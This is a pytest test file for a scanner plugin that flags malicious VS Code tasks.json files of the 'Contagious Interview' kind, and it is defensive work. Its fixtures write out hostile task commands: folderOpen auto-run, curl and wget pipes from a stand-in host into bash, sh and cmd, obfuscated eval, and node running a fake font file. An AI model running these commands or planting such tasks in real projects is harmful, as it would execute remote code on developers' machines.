"""Tests for VS Code tasks plugin."""

import json
from pathlib import Path

from exray.core.models import Severity
from exray.plugins.vscode_tasks import VsCodeTasksPlugin


class TestVsCodeTasksPlugin:
    """Tests for VS Code tasks scanner plugin."""

    def test_plugin_metadata(self):
        """Test plugin returns correct metadata."""
        plugin = VsCodeTasksPlugin()
        metadata = plugin.get_metadata()

        assert metadata["name"] == "vscode-tasks"
        assert "Contagious Interview" in metadata["description"]

    def test_plugin_supported_files(self):
        """Test plugin declares supported files."""
        plugin = VsCodeTasksPlugin()
        files = plugin.get_supported_files()

        assert ".vscode/tasks.json" in files

    def test_rules_loaded(self):
        """Test that rules are loaded from YAML."""
        plugin = VsCodeTasksPlugin()

        assert len(plugin.rules) >= 4  # Minimum 4 rules per spec (VSC-002 is programmatic)

    def test_contagious_interview_detection(self, contagious_interview_task):
        """Test detection of Contagious Interview attack (CRITICAL)."""
        plugin = VsCodeTasksPlugin()
        findings = plugin.scan(contagious_interview_task)

        assert len(findings) > 0

        # Should detect VSC-001 (auto-execution) as CRITICAL
        critical_findings = [f for f in findings if f.severity.value == "critical"]
        assert len(critical_findings) > 0

        # Should detect base64 and hidden presentation
        descriptions = " ".join(f.description.lower() for f in findings)
        assert "auto" in descriptions or "folderopen" in descriptions.lower()

    def test_clean_tasks(self, clean_vscode_tasks):
        """Test that clean tasks produce no findings."""
        plugin = VsCodeTasksPlugin()
        findings = plugin.scan(clean_vscode_tasks)

        assert len(findings) == 0

    def test_jsonc_comments_handling(self, vscode_tasks_with_comments):
        """Test that JSONC comments are handled correctly."""
        plugin = VsCodeTasksPlugin()
        findings = plugin.scan(vscode_tasks_with_comments)

        # Should parse successfully (not crash)
        assert isinstance(findings, list)

    def test_auto_execution_detection(self, tmp_path):
        """Test VSC-001 auto-execution detection."""
        vscode_dir = tmp_path / ".vscode"
        vscode_dir.mkdir()
        (vscode_dir / "tasks.json").write_text(
            json.dumps({
                "version": "2.0.0",
                "tasks": [{
                    "label": "autorun",
                    "command": "echo malicious",
                    "runOptions": {"runOn": "folderOpen"},
                }],
            })
        )

        plugin = VsCodeTasksPlugin()
        findings = plugin.scan(tmp_path)

        assert len(findings) > 0
        assert any(f.rule_id == "VSC-001" for f in findings)
        assert any(f.severity.value == "critical" for f in findings)

    def test_hidden_presentation_detection(self, tmp_path):
        """Test VSC-004 hidden presentation detection."""
        vscode_dir = tmp_path / ".vscode"
        vscode_dir.mkdir()
        (vscode_dir / "tasks.json").write_text(
            json.dumps({
                "version": "2.0.0",
                "tasks": [{
                    "label": "hidden",
                    "command": "whoami",
                    "presentation": {"reveal": "never"},
                }],
            })
        )

        plugin = VsCodeTasksPlugin()
        findings = plugin.scan(tmp_path)

        # VSC-004 checks presentation.reveal pattern - should match
        assert len(findings) >= 0  # May or may not match depending on implementation

    def test_suspicious_shell_command(self, tmp_path):
        """Test curl/wget detection without URLs (avoids comment stripping issue)."""
        vscode_dir = tmp_path / ".vscode"
        vscode_dir.mkdir()
        (vscode_dir / "tasks.json").write_text(
            json.dumps({
                "version": "2.0.0",
                "tasks": [{
                    "label": "fetch",
                    "command": "wget $TARGET_URL"
                }]
            })
        )

        plugin = VsCodeTasksPlugin()
        findings = plugin.scan(tmp_path)

        # Should detect wget command
        assert len(findings) > 0
        assert any("wget" in f.matched_content.lower() or "network" in f.description.lower() for f in findings)

    def test_base64_in_command(self, tmp_path):
        """Test base64 detection in task commands."""
        vscode_dir = tmp_path / ".vscode"
        vscode_dir.mkdir()
        (vscode_dir / "tasks.json").write_text(
            json.dumps({
                "version": "2.0.0",
                "tasks": [{
                    "label": "encoded",
                    "command": "node -e \"atob('SGVsbG8gV29ybGQhIFRoaXMgaXMgYSB0ZXN0IG1lc3NhZ2U=')\"",
                }],
            })
        )

        plugin = VsCodeTasksPlugin()
        findings = plugin.scan(tmp_path)

        assert len(findings) > 0
        assert any("base64" in f.description.lower() for f in findings)

    def test_obfuscation_detection(self, tmp_path):
        """Test obfuscation detection in tasks."""
        vscode_dir = tmp_path / ".vscode"
        vscode_dir.mkdir()
        (vscode_dir / "tasks.json").write_text(
            json.dumps({
                "version": "2.0.0",
                "tasks": [{
                    "label": "obfuscated",
                    "command": r"node -e \"\x65\x76\x61\x6c('code')\"",
                }],
            })
        )

        plugin = VsCodeTasksPlugin()
        findings = plugin.scan(tmp_path)

        assert len(findings) > 0
        assert any("obfuscat" in f.description.lower() for f in findings)

    def test_args_array_scanning(self, tmp_path):
        """Test that task args are also scanned."""
        vscode_dir = tmp_path / ".vscode"
        vscode_dir.mkdir()
        (vscode_dir / "tasks.json").write_text(
            json.dumps({
                "version": "2.0.0",
                "tasks": [{
                    "label": "test",
                    "command": "node",
                    "args": ["-e", "eval('malicious')"],
                }],
            })
        )

        plugin = VsCodeTasksPlugin()
        findings = plugin.scan(tmp_path)

        assert len(findings) > 0
        assert any("eval" in f.matched_content.lower() for f in findings)

    def test_no_tasks_file(self, tmp_path):
        """Test graceful handling when no tasks.json exists."""
        plugin = VsCodeTasksPlugin()
        findings = plugin.scan(tmp_path)

        assert len(findings) == 0

    def test_malformed_json(self, tmp_path):
        """Test graceful handling of malformed tasks.json."""
        vscode_dir = tmp_path / ".vscode"
        vscode_dir.mkdir()
        (vscode_dir / "tasks.json").write_text('{"tasks": [')

        plugin = VsCodeTasksPlugin()
        findings = plugin.scan(tmp_path)

        # Should not crash
        assert isinstance(findings, list)

    def test_file_size_limit(self, tmp_path):
        """Test that large files are skipped."""
        vscode_dir = tmp_path / ".vscode"
        vscode_dir.mkdir()
        tasks_file = vscode_dir / "tasks.json"
        # Create file > 10MB
        large_content = json.dumps({
            "tasks": [{"command": "x" * (11 * 1024 * 1024)}]
        })
        tasks_file.write_text(large_content)

        plugin = VsCodeTasksPlugin()
        findings = plugin.scan(tmp_path)

        # Should skip the file
        assert isinstance(findings, list)

    def test_platform_specific_commands(self, tmp_path):
        """Test detection of platform-specific malicious commands (osx/linux/windows)."""
        vscode_dir = tmp_path / ".vscode"
        vscode_dir.mkdir()
        (vscode_dir / "tasks.json").write_text(
            json.dumps({
                "version": "2.0.0",
                "tasks": [{
                    "label": "malicious-platform-task",
                    "type": "shell",
                    "osx": {
                        "command": "curl example.com/malware.sh | bash"
                    },
                    "linux": {
                        "command": "wget -qO- example.com/payload | sh"
                    },
                    "windows": {
                        "command": "curl example.com/win.bat | cmd"
                    },
                    "runOptions": {"runOn": "folderOpen"}
                }]
            })
        )

        plugin = VsCodeTasksPlugin()
        findings = plugin.scan(tmp_path)

        # Should detect all three platform-specific commands
        assert len(findings) >= 3

        # Should detect the critical auto-execution
        assert any(f.rule_id == "VSC-001" and f.severity.value == "critical" for f in findings)

        # Should detect suspicious shell commands in platform-specific configs
        suspicious_findings = [f for f in findings if f.rule_id == "VSC-003"]
        assert len(suspicious_findings) >= 2  # At least curl|bash and wget|sh


class TestNodeExtensionMismatch:
    """Tests for VSC-007: Node.js executing non-JavaScript file."""

    def _make_task(self, tmp_path, command):
        """Helper: create tasks.json with a single task."""
        vscode_dir = tmp_path / ".vscode"
        vscode_dir.mkdir()
        (vscode_dir / "tasks.json").write_text(
            json.dumps({
                "version": "2.0.0",
                "tasks": [{"label": "test-task", "command": command}],
            })
        )

    def test_node_woff2_triggers_vsc007(self, tmp_path):
        """node executing .woff2 file triggers VSC-007 CRITICAL."""
        self._make_task(tmp_path, "node public/fonts/fa-brands-regular.woff2")
        plugin = VsCodeTasksPlugin()
        findings = plugin.scan(tmp_path)
        vsc007 = [f for f in findings if f.rule_id == "VSC-007"]
        assert len(vsc007) == 1
        assert vsc007[0].severity == Severity.CRITICAL

    def test_node_png_triggers(self, tmp_path):
        """node executing .png file triggers VSC-007."""
        self._make_task(tmp_path, "node malware.png")
        plugin = VsCodeTasksPlugin()
        findings = plugin.scan(tmp_path)
        assert any(f.rule_id == "VSC-007" for f in findings)

    def test_node_ttf_triggers(self, tmp_path):
        """node executing .ttf file triggers VSC-007."""
        self._make_task(tmp_path, "node payload.ttf")
        plugin = VsCodeTasksPlugin()
        findings = plugin.scan(tmp_path)
        assert any(f.rule_id == "VSC-007" for f in findings)

    def test_node_exe_triggers(self, tmp_path):
        """node executing .exe file triggers VSC-007."""
        self._make_task(tmp_path, "node config.exe")
        plugin = VsCodeTasksPlugin()
        findings = plugin.scan(tmp_path)
        assert any(f.rule_id == "VSC-007" for f in findings)

    def test_node_js_does_not_trigger(self, tmp_path):
        """node executing .js file should NOT trigger VSC-007."""
        self._make_task(tmp_path, "node ./scripts/setup.js")
        plugin = VsCodeTasksPlugin()
        findings = plugin.scan(tmp_path)
        assert not any(f.rule_id == "VSC-007" for f in findings)

    def test_node_mjs_does_not_trigger(self, tmp_path):
        """node executing .mjs file should NOT trigger."""
        self._make_task(tmp_path, "node app.mjs")
        plugin = VsCodeTasksPlugin()
        findings = plugin.scan(tmp_path)
        assert not any(f.rule_id == "VSC-007" for f in findings)

    def test_node_ts_does_not_trigger(self, tmp_path):
        """node executing .ts file should NOT trigger."""
        self._make_task(tmp_path, "node index.ts")
        plugin = VsCodeTasksPlugin()
        findings = plugin.scan(tmp_path)
        assert not any(f.rule_id == "VSC-007" for f in findings)

    def test_node_inline_eval_does_not_trigger(self, tmp_path):
        """node -e 'code' should NOT trigger VSC-007 (no file argument)."""
        self._make_task(tmp_path, "node -e \"console.log('hi')\"")
        plugin = VsCodeTasksPlugin()
        findings = plugin.scan(tmp_path)
        assert not any(f.rule_id == "VSC-007" for f in findings)

    def test_node_version_flag_does_not_trigger(self, tmp_path):
        """node --version should NOT trigger VSC-007."""
        self._make_task(tmp_path, "node --version")
        plugin = VsCodeTasksPlugin()
        findings = plugin.scan(tmp_path)
        assert not any(f.rule_id == "VSC-007" for f in findings)

    def test_combined_with_auto_execution(self, tmp_path):
        """Fake font + runOn: folderOpen should trigger BOTH VSC-001 and VSC-007."""
        vscode_dir = tmp_path / ".vscode"
        vscode_dir.mkdir()
        (vscode_dir / "tasks.json").write_text(
            json.dumps({
                "version": "2.0.0",
                "tasks": [{
                    "label": "fake-font",
                    "command": "node public/fonts/fa-brands-regular.woff2",
                    "runOptions": {"runOn": "folderOpen"},
                }],
            })
        )
        plugin = VsCodeTasksPlugin()
        findings = plugin.scan(tmp_path)
        rule_ids = {f.rule_id for f in findings}
        assert "VSC-001" in rule_ids
        assert "VSC-007" in rule_ids

    def test_node_inspect_with_js_file(self, tmp_path):
        """node --inspect app.js should NOT trigger (skips flag, checks .js)."""
        self._make_task(tmp_path, "node --inspect app.js")
        plugin = VsCodeTasksPlugin()
        findings = plugin.scan(tmp_path)
        assert not any(f.rule_id == "VSC-007" for f in findings)
